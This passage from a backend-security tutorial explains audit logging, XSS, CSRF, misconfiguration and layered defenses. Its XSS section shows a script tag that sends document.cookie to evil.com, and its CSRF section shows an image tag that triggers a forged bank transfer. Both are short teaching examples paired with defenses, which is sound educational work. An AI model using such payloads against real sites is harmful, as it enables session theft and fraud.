Do not only test the happy path (legitimate users accessing their own data). Write dedicated automated tests for authorization scenarios:

- User A cannot access resources belonging to User B
- A user with the `member` role cannot access admin-level functions
- An unauthenticated user cannot access any authenticated resources

Manual testing of these cases is insufficient. As your system grows and changes, manual tests get missed. Automated tests run in your CI/CD pipeline on every change, ensuring your authorization model remains intact no matter how many new features are added.

# Security for Backend Systems — Part 3

## Audit Logs

The fourth and final pillar of a solid authorization framework is **audit logging**.

Every time a sensitive resource is accessed — for example, an admin endpoint — you should log that event in a dedicated audit table. The log entry should record which endpoint was accessed, at what timestamp, and by which user.

Similarly, every time an authorization check fails — when a user tries to access the resources of another user — you should flag that incident and log it as a **breach event** in a dedicated log. The reason is simple: if someone is actively probing your system, trying to find holes in your authorization layer, you want to know about it. Audit logs give you the visibility to detect these patterns early and take preventive action before real damage is done.

---

## Cross-Site Scripting (XSS)

Cross-Site Scripting, or **XSS**, is one of the most dangerous and widely occurring browser-side vulnerabilities. We will look at a working demo of this towards the end, but first let's understand what it is, why it is so dangerous, and how to prevent it.

### What Is XSS?

XSS occurs when an attacker manages to get their JavaScript code to **execute in a genuine user's browser, in the context of your platform**. In other words, the attacker's script runs as if it were a legitimate part of your frontend.

### Why Is It So Dangerous?

JavaScript running in the context of a browser page has enormous power. A malicious script running inside your platform can:

- **Read everything on the page** — including any sensitive data visible to the logged-in user
- **Make API requests impersonating the user** — since the script has access to cookies (if `HttpOnly` is not set) and `localStorage`, it can make authenticated requests to your backend on behalf of the user
- **Redirect the user to phishing pages** — fake login pages designed to steal credentials
- **Alter the page content** — tricking genuine users into believing they are on a completely different website

If an attacker manages to run their code in another user's browser, the damage potential is severe.

---

### How XSS Works: Stored XSS

The most common and most destructive form is **stored XSS**. Let's walk through a realistic scenario.

Imagine you have a blogging platform with a comment system. Users write comments in Markdown — using `#` for headings, `-` for bullet points, and so on. When a comment is submitted, the Markdown is converted to HTML using libraries like Remark or Rehype (in the React ecosystem), and that HTML is injected directly into the DOM so users can see formatted comments.

The injection into the DOM is typically done something like this in React:

```html
<div dangerouslySetInnerHTML={{ __html: convertedHtml }} />
```

Notice that React has **intentionally named this attribute `dangerouslySetInnerHTML`** — the name itself is a warning. React is telling you that when you do this, you are on your own and must be careful about XSS, because you are directly injecting HTML into the page.

#### The Attack

If the server does not sanitize the user's input before storing it in the database, a malicious user can craft a comment that, after Markdown-to-HTML conversion, contains a `<script>` tag:

```html
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>
```

When this comment is stored in the database and later fetched by other users, the HTML (including the script tag) gets injected into the DOM. The script tag executes immediately in every victim's browser — in the full context of your platform. The attacker's server at `evil.com` now receives every victim's session cookies, local storage contents, and anything else the script captures.

This is called **stored XSS** because the malicious script is permanently stored in your database and runs for every user who views that page.

#### Other Types of XSS

- **Reflected XSS** — the malicious script is embedded in a URL parameter. When the victim clicks the crafted link, the server reflects the script back in the response and it executes in the browser.
- **DOM-based XSS** — similar to the scenario above, where unsanitized content is injected into the DOM directly by client-side JavaScript, without necessarily going through the server.

### The Root Cause

All XSS attacks share the same root cause as SQL injection: **user-provided data being treated as code rather than data**. Instead of happening at the database layer, it happens in the browser. When user-provided content enters the HTML and JavaScript context of a page, characters and tags that were just data in one context carry executable meaning in another. That is the moment XSS becomes possible.

---

### Preventing XSS

#### 1. Sanitization at the Server

The primary prevention is **sanitizing user-provided content before storing it in the database**. When the server receives user markup or HTML, it must scan for and strip out dangerous constructs — `<script>` tags being the most obvious example. Only clean, safe HTML should ever reach the database and be served back to other users.

This is the core principle that applies to all user-provided content, regardless of type. Whether it is a search query, a comment, an image, or an uploaded file — every time you deal with data coming from users, you must be deliberate and careful about how you handle, store, and render it.

#### 2. Content Security Policy (CSP)

**Content Security Policy** is an HTTP response header your server sends to the browser. It gives the browser explicit instructions about what kinds of resources it is allowed to execute and what it should block.

For example, using CSP you can tell the browser:

- Only execute scripts loaded from these specific trusted domains
- **Do not run any inline scripts at all**

The second rule is particularly powerful. The stored XSS attack we described relies on injecting an inline `<script>` tag into the DOM. With CSP configured to block all inline scripts, even if the malicious tag makes it through your sanitization layer, the browser will **refuse to execute it entirely**.

You can also use CSP to restrict which domains images can be loaded from, which further limits the attack surface.

**Important caveat:** CSP is not a primary prevention — it is a last line of defense. The real fix is proper sanitization. CSP is configured to catch anything that somehow slips through your defenses. Think of it this way: sanitization prevents the attack from being stored in the first place; CSP prevents the damage in case something was missed. Both layers together give you robust protection.

---

## Cross-Site Request Forgery (CSRF)

CSRF, or **Cross-Site Request Forgery**, deserves a brief mention. It is not a major threat to modern web applications — but it is worth understanding conceptually, especially since it still affects legacy systems and outdated practices.

### How CSRF Works

CSRF exploits the fact that browsers automatically include cookies with every request to a domain, even if that request originates from a completely different site.

A realistic destructive scenario: you are logged into `bank.com`. Your browser has a valid session cookie for `bank.com`. You then visit `evil.com` — maybe through a phishing link or ordinary web browsing. The malicious page at `evil.com` contains a hidden form or an image tag whose `src` URL triggers a request to `bank.com`:

```html
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
```

Your browser loads this image, which sends a `GET` request to `bank.com`. Since it is your browser making the request, your `bank.com` session cookie is automatically included. The `bank.com` server sees a request with a valid session cookie and treats it as legitimate — even though you never intended to make it.

### Why It Is Not a Major Threat Today

Modern defenses make CSRF largely a solved problem:

- **`SameSite` cookie attribute** — As discussed in the authentication section, setting `SameSite` to `Strict` or `Lax` prevents cookies from being sent on cross-origin requests. Modern browsers default to `Lax` for cookies that don't specify `SameSite`, which means you are protected by default unless you explicitly set `SameSite=None`.
- **CORS configuration** — While CORS is not a security mechanism per se, your backend's CORS configuration checks whether incoming requests originate from your own frontend. If the origin does not match, the browser blocks the response.

As long as you are using modern frameworks, libraries, and following current best practices, CSRF is unlikely to be a threat you need to actively worry about.

---

## Security Misconfiguration

Beyond specific attack vectors, a significant class of vulnerabilities arises simply from **misconfiguration** — engineers making the wrong settings choices, often unintentionally.

### 1. Secrets in Source Code

The most obvious and damaging misconfiguration is storing secrets — API keys, database passwords, encryption keys, JWT secrets, authentication secrets — directly in source code that gets committed to version control (Git, GitHub, Bitbucket, GitLab).

The moment a secret lands in your repository, everyone with repository access can see it. They can access your database, call external services using your API keys, tamper with user data using your encryption keys, and forge authentication tokens.

**The rule:** Secrets always live in environment variables or a dedicated secrets management service like AWS Parameter Store, HashiCorp Vault, or similar.

**Critical note:** Even if you accidentally commit a secret and then delete it in the next commit, **it is still in your commit history**. Anyone who walks through the history can find it. The moment a secret is accidentally committed to version control, the correct response is to immediately **rotate or invalidate that secret and generate a new one**. Deleting it from the code is not enough.

### 2. Debug Mode in Production

During local development, your logging is typically set to **`debug` level**. At this level, your application logs everything: detailed error messages with full stack traces, explicit SQL queries, database connection pool configurations, database transaction details, and sometimes even sensitive user data.

Stack traces alone reveal a lot — function names, file paths, code structure — information an attacker can use to understand your system and plan targeted attacks.

In production, your log level must be set to **`info`** (or higher). At `info` level, debug logs, stack traces, SQL queries, and sensitive data are never printed. They are only meant for local development.

If you forget to configure the log level in production and it defaults to `debug`, all of that sensitive information ends up in your production logs. And if your production logs are ever breached, the attacker gains deep knowledge about your system's internals.

Be deliberate about log levels across all three environments:

- **Development (local):** `debug` — verbose, all details
- **Staging:** `info` or `warn` — moderate
- **Production:** `info` — essential operational information only

### 3. Missing Security Headers

There is a family of HTTP response headers specifically designed to instruct browsers on how to behave securely. We have already discussed CSP. Another important one is:

**`X-Frame-Options`** — When properly configured, this header prevents other websites from embedding your site inside an `<iframe>`. Without it, an attacker can host your site in an iframe on their malicious domain. Using a technique called **clickjacking**, they can overlay invisible elements on top of your legitimate UI, capturing user interactions (like clicks on buttons or credential entries) without the user realizing they are being tricked.

The good news is that you don't need to configure each of these headers manually. Every major web framework — Node.js/Express, Go/Echo/Gin, Python/Django, and others — provides ready-made security middleware that configures all industry-standard security headers with essentially a one-line change. Use them.

---

## The Unified Security Mental Model

Having covered all these vulnerabilities, it is worth stepping back and recognizing the single thread that connects all of them: **boundaries**.

Every vulnerability we discussed — SQL injection, command injection, XSS, broken authorization — happened at a boundary:

- **SQL injection** — untrusted user input crossed into the boundary of the database query language
- **XSS** — user-provided Markdown crossed into the boundary of HTML and executable JavaScript
- **Broken authorization** — a request crossed the boundary of what a user is permitted to access

Whenever data crosses a boundary between systems, between privilege levels, between programming languages, or between trust zones — that is where vulnerabilities arise.

> **The three questions to ask yourself every time you write code:**
> 1. Where is data crossing a boundary?
> 2. What assumptions am I making about that data?
> 3. What if those assumptions are wrong?

If you internalize these three questions and ask them reflexively every time you encounter data crossing a boundary, you will avoid the vast majority of vulnerabilities that modern backend applications suffer from.

---

## Defense in Depth: Thinking in Layers

No single defense mechanism is perfect. Security works best when you have **multiple independent layers**, so that an attacker must bypass all of them simultaneously to cause harm.

Here is a practical layered defense framework:

**Layer 1 — Input Validation**
This is your first and most important line of defense. At the routing layer, immediately after a route is matched, strictly validate every piece of incoming data. By the time data leaves your validation layer and reaches your handler, it should be exactly in the structure you expect. No surprises, no unexpected types, no missing required fields. This single habit eliminates an enormous surface area of attacks.

**Layer 2 — Parameterized Operations**
For all operations that interact with other systems — databases, operating system commands, file operations — always use APIs that accept explicit parameters separately from the command structure. Never build commands by string concatenation. This eliminates the entire class of injection attacks.

**Layer 3 — Authorization at the Point of Access**
Verify authorization not just at the routing layer, but at the actual point where data is accessed — the repository layer. The BOLA vulnerability exists precisely because authorization was checked upstream but not at the point of access. Always scope your database queries to the authenticated user.

**Layer 4 — Security Headers and Policies**
Configure your browser and server to limit the damage in case something slips through earlier layers. CORS, CSP, `X-Frame-Options`, and other security headers are not primary defenses — they are damage-containment mechanisms that reduce the scope of any attack that does get through.

**Layer 5 — Monitoring and Logging**
Monitor for suspicious activity and log it properly. Send alerts, raise flags, route events to your logging service. If an attacker is probing your system, you want to know. Audit logs for sensitive endpoints and breach event logs for failed authorization checks give you the visibility to detect and respond to attacks early.

The power of layered defense is this: even if one layer has a weakness, the attacker still has to breach every other layer simultaneously. The probability of that is dramatically lower than the probability of breaching any single layer.

---

## Resources for Going Deeper

Security is a vast domain. This chapter was intended to build the mindset — to make you paranoid about boundaries and assumptions — not to be a comprehensive guide. If you want to go deeper, here are two excellent resources:

### PortSwigger Web Security Academy

PortSwigger is the company behind Burp Suite, one of the most widely used ethical hacking and penetration testing tools. Their **Web Security Academy** at [portswigger.net/web-security](https://portswigger.net/web-security) provides a comprehensive catalog of vulnerabilities — how they work, the computer science behind them, and hands-on practical labs where you can exploit them yourself in a safe environment.

You will recognize many of the topics we covered — SQL injection, XSS, CSRF, OS command injection, authentication vulnerabilities, OAuth attacks, JWT attacks — and many more that go well beyond the scope of a single chapter. The best part: **it is completely free**, with no hidden charges.

### OWASP Top 10 and OWASP Cheat Sheets

**OWASP** (Open Worldwide Application Security Project) is a nonprofit security foundation. Their **OWASP Top 10** is a regularly updated list of the most critical and widespread security vulnerabilities affecting modern web applications. The current list includes:

- Broken Access Control (covering BOLA, BFLA, and related issues)
- Security Misconfiguration
- Injection (SQL injection, OS command injection, and more)
- And many others, each with severity assessments and real-world examples

OWASP also publishes **Cheat Sheets** — concise, practical reference guides on specific security topics. For example:

- The **Authentication Cheat Sheet** covers best practices, bad practices, and known threats for authentication systems
- The **Session Management Cheat Sheet** covers session ID requirements, cryptographic security, conflict scenarios, and industry standards in depth

These cheat sheets are an excellent resource for going deep on any specific security domain. Reading through multiple cheat sheets — approaching security from different angles while keeping the same security mindset — opens up perspectives that are difficult to get from any single source.

---

## Final Thought

Security is not a feature you bolt on at the end, and it is not something you learn once and implement. It is a mindset — a habit of paranoia that you bring to every line of code you write.

Always think about boundaries. Always question your assumptions. And always ask: *what if the data crossing this boundary is not what I expect it to be?*

That habit, consistently applied, is what separates secure systems from vulnerable ones.